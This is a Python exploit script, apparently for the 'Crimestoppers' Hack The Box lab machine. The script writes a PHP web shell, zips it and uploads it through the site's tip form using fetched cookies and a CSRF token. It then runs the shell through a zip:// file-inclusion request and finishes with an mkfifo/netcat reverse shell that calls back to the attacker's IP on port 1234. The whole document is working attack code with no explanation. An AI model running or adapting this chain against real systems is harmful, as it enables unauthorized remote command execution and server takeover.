#!/usr/bin/python3

import requests,argparse,re,os,os.path,urllib.parse

print("User-shell for Crimestoppers.\n\n")

parser = argparse.ArgumentParser()
parser.add_argument("tunnelIp", help="Your tunnel IP",type=str)
args = parser.parse_args()

def createShell():
    if not os.path.isfile('shell.zip'):
        print("[*] Creating shell.php.")
        phpshell = open('shell.php','w')
        phpshell.write("<?php system($_GET['cmd']); ?>")
        phpshell.close()
        print("[+] Zipping shell.php.")
        os.system('zip shell.zip shell.php > /dev/null')

def getCookies():
    print("[*] Fetching cookies.")
    session = requests.Session()
    response = session.get(url)
    cookies = session.cookies.get_dict()
    return cookies

def getToken():
    print("[*] Fetching CSRF-token.")
    req = requests.get(url,cookies=cookies).text
    token = re.findall(r'<input type="text" id="token" name="token" style="display: none" value="(.*)" style="width:355px;" />',req)[0]    
    return token

def getFile():
    zipshell = open('shell.zip','rb').read()
    data = {
        'tip': (None, zipshell),
        'name': (None,'Gio'),
        'token': (None, token),
        'submit': (None, 'Send Tip!')
    }

    print("[*] Uploading shell.zip.")
    post = requests.post(url,cookies=cookies,files=data)
    print("[*] Obtaining location of shell.zip.")
    filename = re.findall(r'secretname=(.*)',post.url)[0]
    fileLocation = "uploads/%s/%s" % (tunnelIp,filename)
    return fileLocation

def exploit(cmd):
    print("[*] Spawning reverse shell.")
    cmd = urllib.parse.quote_plus(cmd)
    xurl = "http://crimestoppers.htb?cmd=%s&op=zip://%s%%23shell" % (cmd, fileLocation) 
    xresponse = requests.get(xurl)

def cleanUp():
    os.remove("shell.zip")
    os.remove("shell.php")

tunnelIp = args.tunnelIp
url = "http://crimestoppers.htb/?op=upload"
createShell()
cookies = getCookies()
token = getToken()
fileLocation = getFile()
cleanUp()

exploit("rm /tmp/gio;mkfifo /tmp/gio;cat /tmp/gio|/bin/bash -i 2>&1|nc %s 1234 >/tmp/gio" % (tunnelIp))